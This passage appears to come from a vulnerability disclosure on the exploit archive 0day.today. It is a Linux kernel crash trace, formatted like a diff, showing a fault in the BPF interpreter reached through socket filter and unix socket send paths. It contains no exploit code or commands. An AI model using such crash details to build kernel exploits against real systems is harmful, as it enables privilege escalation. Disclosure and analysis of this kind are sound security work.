+[  117.274693]  ? alloc_skb_with_frags+0x90/0x2c0
+[  117.274697]  ? __bpf_prog_run32+0x83/0xc0
+[  117.274700]  ? __bpf_prog_run64+0xc0/0xc0
+[  117.274705]  ? sk_filter_trim_cap+0x5c/0x4e0
+[  117.274710]  ? sk_filter_trim_cap+0xf7/0x4e0
+[  117.274715]  ? unix_dgram_sendmsg+0x3e2/0x960
+[  117.274720]  ? entry_SYSCALL_64_fastpath+0x1e/0x86
+[  117.274724]  ? entry_SYSCALL_64_fastpath+0x1e/0x86
+[  117.274728]  ? sock_alloc_inode+0x46/0x110
+[  117.274731]  ? unix_stream_connect+0x840/0x840
+[  117.274734]  ? __sock_create+0x7f/0x2c0
+[  117.274737]  ? entry_SYSCALL_64_fastpath+0x1e/0x86
+[  117.274742]  ? __lock_acquire.isra.31+0x2d/0xb40
+[  117.274746]  ? __wake_up_common_lock+0xaf/0x130
+[  117.274752]  ? unix_stream_connect+0x840/0x840
+[  117.274755]  ? sock_sendmsg+0x6b/0x80
+[  117.274759]  ? sock_write_iter+0x11d/0x1d0
+[  117.274762]  ? sock_sendmsg+0x80/0x80
+[  117.274768]  ? do_raw_spin_unlock+0x86/0x120
+[  117.274782]  ? iov_iter_init+0x77/0xb0
+[  117.274786]  ? __vfs_write+0x23e/0x340
+[  117.274799]  ? kernel_read+0xa0/0xa0
+[  117.274805]  ? __fd_install+0x5/0x160
+[  117.274809]  ? __fget_light+0x9b/0xb0
+[  117.274813]  ? vfs_write+0xe9/0x240
+[  117.274817]  ? SyS_write+0xa7/0x130
+[  117.274820]  ? SyS_read+0x130/0x130
+[  117.274823]  ? lockdep_sys_exit+0x16/0x8e
+[  117.274827]  ? lockdep_sys_exit_thunk+0x16/0x2b
+[  117.274831]  ? entry_SYSCALL_64_fastpath+0x1e/0x86
+[  117.274836] Code: 00 48 0f bf 43 fa 49 01 c7 0f b6 43 f9 c0 e8 04
+0f b6 c0 4c 8d 74 c5 00 4c 89 f7 e8 04 4a 0f 00 4d 8b 36 4c 89 ff e8
+79 49 0f 00 <45> 89 37 e9 17 e6 ff ff 48 8d 7b 01 e8 58 47 0f 00 0f b6
+43 01
+[  117.274885] RIP: ___bpf_prog_run+0x1a77/0x2490 RSP: ffff8801af4e7838
+[  117.274888] ---[ end trace e84b3275ee7b48c9 ]---
+======================================
+
+#  0day.today [2023-03-23]  #
